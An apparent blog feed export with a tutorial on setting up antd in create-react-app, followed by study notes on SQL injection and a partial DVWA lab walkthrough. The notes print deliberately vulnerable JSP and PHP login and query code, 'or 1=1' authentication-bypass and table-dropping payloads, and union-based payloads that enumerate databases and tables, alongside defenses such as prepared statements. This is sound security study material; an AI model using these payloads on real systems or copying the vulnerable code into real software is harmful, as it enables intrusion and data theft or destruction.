<h1 id="在-create-react-app-中使用-antd"><a href="#在-create-react-app-中使用-antd" class="headerlink" title="在 create-react-app 中使用 antd"></a>在 create-react-app 中使用 antd</h1><p>（1）<strong>安装和初始化</strong><br>在命令行中安装 create-react-app 工具:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g create-react-app</div></pre></td></tr></table></figure></p>
<p>新建一个项目:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ create-react-app antd-demo</div></pre></td></tr></table></figure></p>
<p>工具会自动初始化一个脚手架并安装 React 项目的各种必要依赖。接下来进入项目并启动，浏览器会访问 <code>http://localhost:3000/</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> antd-demo</div><div class="line">$ npm start</div></pre></td></tr></table></figure></p>
<p>(2)<strong>引入 antd</strong><br>npm 安装并引入 antd:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm add antd</div></pre></td></tr></table></figure></p>
<p>修改 <code>src/App.js</code>，引入 antd 的按钮组件:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> Button <span class="keyword">from</span> <span class="string">'antd/lib/button'</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">'./App.css'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      &lt;div className=<span class="string">"App"</span>&gt;</div><div class="line">        &lt;Button type=<span class="string">"primary"</span>&gt;Button&lt;<span class="regexp">/Button&gt;</span></div><div class="line"><span class="regexp">      &lt;/</span>div&gt;</div><div class="line">    );</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</div></pre></td></tr></table></figure></p>
<p>修改 <code>src/App.css</code>，在文件顶部引入 <code>antd/dist/antd.css</code>:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">import</span> <span class="string">'~antd/dist/antd.css'</span>;</div><div class="line"></div><div class="line"><span class="selector-class">.App</span> &#123;</div><div class="line">  <span class="attribute">text-align</span>: center;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在可以看到页面上已经有了 antd 的蓝色按钮组件。<br>(3)<strong>高级配置</strong><br>步骤(2)已经把组件成功运行起来了，但是在实际开发过程中还有很多问题，例如上面的例子实际上加载了全部的 antd 组件的样式（对前端性能是个隐患）。<br>需要对 create-react-app 的默认配置进行自定义，这里使用 <code>react-app-rewired</code> （一个对 create-react-app 进行自定义配置的社区解决方案）。</p>
<p>引入 <code>react-app-rewired</code> 并修改 package.json 里的启动配置:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm add react-app-rewired --dev</div></pre></td></tr></table></figure></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">/* package.json */</div><div class="line">"scripts": &#123;</div><div class="line">-   "start": "react-scripts start",</div><div class="line">+   "start": "react-app-rewired start",</div><div class="line">-   "build": "react-scripts build",</div><div class="line">+   "build": "react-app-rewired build",</div><div class="line">-   "test": "react-scripts test --env=jsdom",</div><div class="line">+   "test": "react-app-rewired test --env=jsdom",</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后在项目根目录创建一个 <code>config-overrides.js</code> 用于修改默认配置:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">override</span>(<span class="params">config, env</span>) </span>&#123;</div><div class="line">  <span class="comment">// do stuff with the webpack config...</span></div><div class="line">  <span class="keyword">return</span> config;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>使用 <code>babel-plugin-import</code>(用于 <strong>按需加载</strong> 组件代码和样式的 babel 插件)，安装它并修改 <code>config-overrides.js</code> 文件:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm add babel-plugin-import --dev</div></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+ <span class="keyword">const</span> &#123; injectBabelPlugin &#125; = <span class="built_in">require</span>(<span class="string">'react-app-rewired'</span>);</div><div class="line"></div><div class="line">  <span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">override</span>(<span class="params">config, env</span>) </span>&#123;</div><div class="line">+   config = injectBabelPlugin([<span class="string">'import'</span>, &#123; <span class="attr">libraryName</span>: <span class="string">'antd'</span>, <span class="attr">libraryDirectory</span>: <span class="string">'es'</span>, <span class="attr">style</span>: <span class="string">'css'</span> &#125;], config);</div><div class="line">    <span class="keyword">return</span> config;</div><div class="line">  &#125;;</div></pre></td></tr></table></figure>
<p>然后移除前面在 <code>src/App.css</code> 里全量添加的 <code>@import &#39;~antd/dist/antd.css&#39;;</code> 样式代码，并且按下面的格式引入模块:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">// src/App.js</span></div><div class="line">  <span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line">- <span class="keyword">import</span> Button <span class="keyword">from</span> <span class="string">'antd/lib/button'</span>;</div><div class="line">+ <span class="keyword">import</span> &#123; Button &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</div><div class="line">  <span class="keyword">import</span> <span class="string">'./App.css'</span>;</div><div class="line"></div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">      <span class="keyword">return</span> (</div><div class="line">        &lt;div className=<span class="string">"App"</span>&gt;</div><div class="line">          &lt;Button type=<span class="string">"primary"</span>&gt;Button&lt;<span class="regexp">/Button&gt;</span></div><div class="line"><span class="regexp">        &lt;/</span>div&gt;</div><div class="line">      );</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">export</span> <span class="keyword">default</span> App;</div></pre></td></tr></table></figure></p>
<p>需要重启<code>npm start</code>访问页面，否则看不到效果。antd 组件的 js 和 css 代码都会按需加载。</p>
<p><strong>自定义主题</strong>：自定义主题需要用到 less 变量覆盖功能，可以引入 react-app-rewire 的 less 插件 <code>react-app-rewire-less</code> 来帮助加载 less 样式，同时修改 <code>config-overrides.js</code> 文件:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm add react-app-rewire-less --dev</div></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">  <span class="keyword">const</span> &#123; injectBabelPlugin &#125; = <span class="built_in">require</span>(<span class="string">'react-app-rewired'</span>);</div><div class="line">+ <span class="keyword">const</span> rewireLess = <span class="built_in">require</span>(<span class="string">'react-app-rewire-less'</span>);</div><div class="line"></div><div class="line">  <span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">override</span>(<span class="params">config, env</span>) </span>&#123;</div><div class="line">-   config = injectBabelPlugin([<span class="string">'import'</span>, &#123; <span class="attr">libraryName</span>: <span class="string">'antd'</span>, <span class="attr">style</span>: <span class="string">'css'</span> &#125;], config);</div><div class="line">+   config = injectBabelPlugin([<span class="string">'import'</span>, &#123; <span class="attr">libraryName</span>: <span class="string">'antd'</span>, <span class="attr">style</span>: <span class="literal">true</span> &#125;], config);</div><div class="line">+   config = rewireLess.withLoaderOptions(&#123;</div><div class="line">+     modifyVars: &#123; <span class="string">"@primary-color"</span>: <span class="string">"#1DA57A"</span> &#125;,</div><div class="line">+   &#125;)(config, env);</div><div class="line">    <span class="keyword">return</span> config;</div><div class="line">  &#125;;</div></pre></td></tr></table></figure>
<p>这里利用了 less-loader 的 <code>modifyVars</code> 来进行主题配置，修改配置后需要重启 <code>npm start</code>才能看到效果。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Ant Design of React 提供开箱即用的高质量 React 组件，具体的UI组件参见&lt;a href=&quot;https://ant.design/docs/react/introduce-cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Ant Design 文档&lt;/a&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="antd" scheme="http://yoursite.com/categories/antd/"/>
    
    
      <category term="antd" scheme="http://yoursite.com/tags/antd/"/>
    
      <category term="dva" scheme="http://yoursite.com/tags/dva/"/>
    
  </entry>
  
  <entry>
    <title>（三）Web安全深度剖析学习【SQL注入】</title>
    <link href="http://yoursite.com/2018/05/22/Web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E5%AD%A6%E4%B9%A0-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2018/05/22/Web安全深度剖析学习-SQL注入/</id>
    <published>2018-05-22T03:00:14.000Z</published>
    <updated>2018-05-29T02:22:15.558Z</updated>
    
    <content type="html"><![CDATA[<p>《Web安全深度剖析》学习总结, 本部分主要总结SQL注入原理。<br><a id="more"></a><br>SQL注入漏洞是Web层面最高危的漏洞之一。</p>
<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>SQL注入指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意SQL查询，从而进一步得到相应的数据信息。</p>
<p>即SQL注入通过把额外的SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串后，最终达到欺骗服务器执行恶意的SQL命令。</p>
<p><strong>万能密码案例</strong>（JSP + SQL Server）<br>假设数据库中只有admin用户，密码为password。</p>
<p>一般登录某个网站需要输入用户名和密码，现在构造一个特殊用户名 <code>&#39;or 1=1--</code>，其中<code>--</code>是SQL Server的单行注释符号。现在使用该特殊用户名登录，密码可随意填写或不填，都可正常登录。</p>
<p>下面分析处理用户登录的程序：<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">findAdmin</span><span class="params">(Admin admin)</span> </span>&#123;</div><div class="line">    String sql = <span class="string">"select count(*) from admin where username='"</span>+admin.getUsername()+<span class="string">"' </span></div><div class="line"><span class="string">    and password='"</span>+admin.getPassword()+<span class="string">"'"</span>;   <span class="comment">//SQL查询语句</span></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        ResultSet res = <span class="keyword">this</span>.conn.createStatement().executeQuery(sql);  <span class="comment">//执行SQL语句</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span>(res.next()) &#123;</div><div class="line">            <span class="keyword">int</span> i = res.getInt(<span class="number">1</span>);   <span class="comment">//获取第一列的值</span></div><div class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;  <span class="comment">//如果结果大于0，返回true</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</div><div class="line">        e.printStackTrace();  <span class="comment">//打印异常信息</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>上述SQL语句的本意是，在数据库中查询username=xxx&amp;&amp;password=xxx的结果，若查询结果大于0，则表示用户存在，返回true，表示登录成功，否则返回false，登录失败。</p>
<p>现在假设用户名为admin,密码为password，执行SQL语句如下：<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span> from admin where username</span>=<span class="string">'admin'</span> and password=<span class="string">'password'</span></div></pre></td></tr></table></figure></p>
<p>此时数据库中存在admin用户，并且密码为password，查询结果大于0，返回true，用户登录成功。</p>
<p>接下来使用构造的特殊用户登录，执行SQL语句如下：<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span> from admin where username</span>=<span class="string">''</span>or <span class="number">1</span>=<span class="number">1</span>--<span class="string">' and password='</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
<p>此时password字段被注释掉了，所以输不输入密码都无所谓，并且<code>username=&#39;&#39;or 1=1</code>语句永远为真，所以最终执行的SQL语句相当于：<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span> from admin  <span class="comment">//查询admin表所有数据条数</span></span></div></pre></td></tr></table></figure></p>
<p>显然以上查询语句返回条数大于0，返回true，可以成功登录。至此一次简单的SQL注入过程完成。</p>
<p>SQL注入危害很大，假设构造用户名如下： <code>&#39;or 1=1;drop table admin--</code>，由于SQL Server支持多语句执行，这里可以直接删除admin表。危害很大滴！</p>
<p>SQL注入漏洞的成因：用户输入的数据被SQL解释器执行。</p>
<h1 id="注入漏洞分类"><a href="#注入漏洞分类" class="headerlink" title="注入漏洞分类"></a>注入漏洞分类</h1><p>常见的SQL注入类型包括：数字型和字符型。<br>不管分类如何，攻击者的目的都是绕过程序限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>当输入的参数为整型时，如ID、年龄、页码等，若存在注入漏洞，则可以认为是数字型注入。数字型注入是最简单的一种。<br>假设URL为<code>http://www.xxser.com/test.php?id=8</code>，可以猜测SQL语句为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table where id=<span class="number">8</span></div></pre></td></tr></table></figure></p>
<p><strong>测试步骤如下：</strong><br>(1) <code>http://www.xxser.com/test.php?id=8</code><br>SQL语句为<code>select * from table where id=8</code>，该语句会出错，导致脚本程序无法正常从数据库中获取数据，从而使原来的页面出现异常。<br>(2)<code>http://www.xxser.com/test.php?id=8 and 1=1</code><br>SQL语句为<code>select * from table where id=8 and 1=1</code>，此时语句执行正常，返回数据与原始请求无异。<br>(3)<code>http://www.xxser.com/test.php?id=8 and 1=2</code><br>SQL语句为<code>select * from table where id=8 and 1=2</code>，语句执行正常，但无法查询出数据，因为<code>and 1=2</code>始终为假，返回数据与原始请求有差异。</p>
<p>若以上三个步骤都满足，则程序可能存在SQL注入漏洞。</p>
<p>数字型注入多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，如参数<code>id=8</code>，PHP会自动推导变量id的数据类型为int类型，<code>id=8 and 1=1</code>会推到为string 类型。而JAVA、C++等强类型语言，若试图把一个string类型转换为int类型会抛出异常。所以强类型语言很少存在数字型注入漏洞。</p>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>当输入参数为字符串时，称为字符型注入。数字类型不需要单引号闭合，而字符串类型一般需要使用单引号来闭合。<br>字符型注入关键：如何闭合SQL语句以及注释多余的代码。只要是字符串类型注入，都必须闭合单引号以及注释多余的代码。<br>例如，update语句：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update Person set username=<span class="string">'username'</span>,set password=<span class="string">'password'</span> where id=<span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>现在对上述SQL语句进行注入，需要闭合单引号，可以在username或password处插入语句<code>&#39;+(select@@version)+&#39;</code>，最终执行的SQL语句为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update Person set username=<span class="string">'username'</span>,set password=<span class="string">''</span>+(select@@version)+<span class="string">''</span> where id=<span class="number">1</span></div></pre></td></tr></table></figure></p>
<p><strong>补充：</strong> 不同的数据库，字符串连接符不同，SQL Server字符串连接符号为<code>+</code>，Oracle字符串连接符号为<code>||</code>，MySQL字符串连接符号为<code>+</code>。</p>
<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>Cookie注入、POST注入、盲注、延时注入都是数字型注入和字符型注入在不同位置的展现形式，都可归纳为数字型注入和字符型注入。</p>
<ul>
<li>POST注入(注入字段在POST数据中)</li>
<li>Cookie注入(注入字段在Cookie数据中)</li>
<li>延时注入(使用数据库延时特性注入)</li>
<li>搜索注入(注入处为搜索的地点)</li>
<li>base64注入(注入字符串需要经过base64加密)</li>
</ul>
<h1 id="防止SQL注入"><a href="#防止SQL注入" class="headerlink" title="防止SQL注入"></a>防止SQL注入</h1><p>关键在于后端程序对用户输入进行过滤。防御主要分为两种：数据类型判断和特殊字符转义。</p>
<h2 id="严格的数据类型"><a href="#严格的数据类型" class="headerlink" title="严格的数据类型"></a>严格的数据类型</h2><p>数据类型处理正确后，足以抵挡数字型注入。对于强类型语言，几乎不存在数字类型的注入。对于弱类型语言，需要在程序中严格判断数据类型。如使用<code>is_numeric()</code>、<code>ctype_digit()</code>等函数判断数据类型。</p>
<h2 id="特殊字符转义"><a href="#特殊字符转义" class="headerlink" title="特殊字符转义"></a>特殊字符转义</h2><p>此方法针对字符型注入。由于攻击者在字符型注入中会使用单引号等特殊字符，可以将这些特殊字符转义，即可防御字符型SQL注入。</p>
<h2 id="使用预编译语句"><a href="#使用预编译语句" class="headerlink" title="使用预编译语句"></a>使用预编译语句</h2><p>Java提供了三个接口与数据库交互，<code>Statement</code>、<code>PrepareStatement</code>、<code>CallableStatement</code>。<br><code>Statement</code>用于执行静态SQL语句，并返回它所生成结果的对象。<br><code>PrepareStatement</code>为<code>Statement</code>的字类，表示预编译SQL语句的对象。<br><code>CallableStatement</code>为<code>PrepareStatement</code>的子类，用于执行SQL存储过程。</p>
<h2 id="框架技术"><a href="#框架技术" class="headerlink" title="框架技术"></a>框架技术</h2><p>在众多的框架中，有一类框架专门与数据库打交道，称为持久层框架，比较有代表性的有Hibernate、MyBatis、JORM等。</p>
<h1 id="DVWA之SQL注入"><a href="#DVWA之SQL注入" class="headerlink" title="DVWA之SQL注入"></a>DVWA之SQL注入</h1><p>参考博客<a href="www.freebuf.com/articles/web/120747.html">新手指南：DVWA-1.9全级别教程之SQL Injection </a></p>
<p>SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p>
<p>(1)基于报错的检测方法：<br>各种符号以及组合： <code>&#39;</code> <code>&quot;</code> <code>(</code>  <code>%</code> </p>
<p>(2)基于布尔的检测：<br><code>1&#39; and &#39;1&#39;=&#39;1</code> 和 <code>1&#39; and &#39;1&#39;=&#39;2</code> , 相当于<code>1&#39; and &#39;1</code> 和 <code>1&#39; and &#39;0</code><br>当返回的结果不同时即有漏洞。</p>
<p>(3)几个常用的函数：</p>
<p><code>user()</code>返回当前数据库连接使用的用户；<br><code>database()</code>返回当前数据库连接使用的数据库；<br><code>version()</code>返回当前数据库的版本；<br>concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而concat_ws函数，第一个参数作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">concat_ws(char(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),user(),database(),version())</div></pre></td></tr></table></figure></p>
<p>其中char()函数为将里面的参数转化为相应的字符，32为空格，58为冒号<code>:</code>，通过这样的方式可以绕过一些简单的过滤机制。</p>
<p>(4)几个全局函数：<br><code>@@datadir</code> :查询数据库的文件位置<br><code>@@hostname</code>:查询主机名<br><code>@@version_compile_os</code>:查询操作系统版本</p>
<h2 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h2><p>自动化的注入神器sqlmap。手工注入（非盲注）的步骤如下：<br>        1.判断是否存在注入，注入是字符型还是数字型<br>        2.猜解SQL查询语句中的字段数<br>        3.确定显示的字段顺序<br>        4.获取当前数据库<br>        5.获取数据库中的表<br>        6.获取表中的字段名<br>        7.下载数据</p>
<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>SOURCE<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</div><div class="line">    <span class="comment">// Get input</span></div><div class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</div><div class="line"></div><div class="line">    <span class="comment">// Check database</span></div><div class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</div><div class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</div><div class="line"></div><div class="line">    <span class="comment">// Get results</span></div><div class="line">    $num = mysql_numrows( $result );</div><div class="line">    $i   = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123;</div><div class="line">        <span class="comment">// Get values</span></div><div class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> );</div><div class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> );</div><div class="line"></div><div class="line">        <span class="comment">// Feedback for end user</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</div><div class="line"></div><div class="line">        <span class="comment">// Increase loop count</span></div><div class="line">        $i++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    mysql_close();</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。<br>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。<br><strong>1.判断是否存在注入，注入是字符型还是数字型</strong><br>(1)输入1，查询成功：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-1.png" alt="1-1"></p>
<p>(2)输入<code>1&#39; and &#39;1&#39;=&#39;2</code>，查询失败，返回结果为空：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-2.png" alt="1-2"></p>
<p>(3)输入<code>1&#39; and &#39;1&#39;=&#39;1</code>，查询成功：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-3.png" alt="1-3"></p>
<p>(4)输入<code>1&#39; or &#39;1&#39;=&#39;1</code>，查询成功:<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-4.png" alt="1-4"><br>返回了多个结果，说明存在字符型注入。</p>
<p><strong>2.猜解SQL查询语句中的字段数</strong><br>(1)输入<code>1&#39; or 1=1 order by 1 #</code>，查询成功(<code>#</code>或<code>--</code>表示注释)：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-5.png" alt="1-5"></p>
<p>SQL <strong>ORDER BY</strong> 子句: 用于对结果集进行排序。根据指定的列对结果集进行排序，默认按照升序对记录进行排序。若希望按照降序对记录进行排序，可以使用 DESC 关键字。<code>ORDER BY 1</code> 表示所select的字段按第一个字段排序。</p>
<p><strong>补充 SQL语句中$与#区别</strong>：<br><code>select * from user where id=${id} and username=#{username}</code><br>在经过编译后，得到如下语句:<code>select * from user where id=2 and username=?</code><br>经过编译后,如果是#{}的形式是编译成?，而如果${}是编译成直接的数据。<br>区别：<br><code>#{}</code>: 是以预编译的形式，将参数设置到SQL语句中;<code>PreparedStatement</code>:防止SQL注入<br><code>${}</code>: 取出的值直接拼装在SQL语句中;会有安全问题。$方式一般用于传入数据库对象，例如传入表名。</p>
<p>(2)输入<code>1&#39; or 1=1 order by 2 #</code>，查询成功:<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-6.png" alt="1-6"></p>
<p>(3)输入<code>1′ or 1=1 order by 3 #</code>，查询失败:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Unknown column &apos;3&apos; in &apos;order clause&apos;</div></pre></td></tr></table></figure></p>
<p>说明执行的SQL查询语句中只有两个字段，即这里的<code>First name</code>、<code>Surname</code>。</p>
<p><strong>3.确定显示的字段顺序</strong><br>输入<code>1&#39; union select 1,2 #</code>，查询成功：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-7.png" alt="1-7"><br>说明执行的SQL语句为<code>select First name,Surname from 表 where ID=&#39;id&#39;</code>。<br><code>select 1,2</code>中的1和2只是为了凑够union关键字前面的那个表的字段数，在sql注入时，在相应位置替换成想要的数据即可。</p>
<p><strong>补充<code>UNION</code>操作符:</strong><br>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。<br>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。SQL UNION 语法如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</div><div class="line"><span class="keyword">UNION</span></div><div class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</div></pre></td></tr></table></figure></p>
<p><strong>4.获取当前数据库</strong><br>输入<code>1′ union select 1,database() #</code>，查询成功：<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-8.png" alt="1-8"><br>说明当前的数据库为<code>dvwa</code>。</p>
<p><strong>5.获取数据库中的表</strong><br>输入<code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>，查询成功:<br><img src="http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-9.png" alt="1-9"><br>说明数据库dvwa中一共有两个表，<code>guestbook</code>与<code>users</code>。</p>
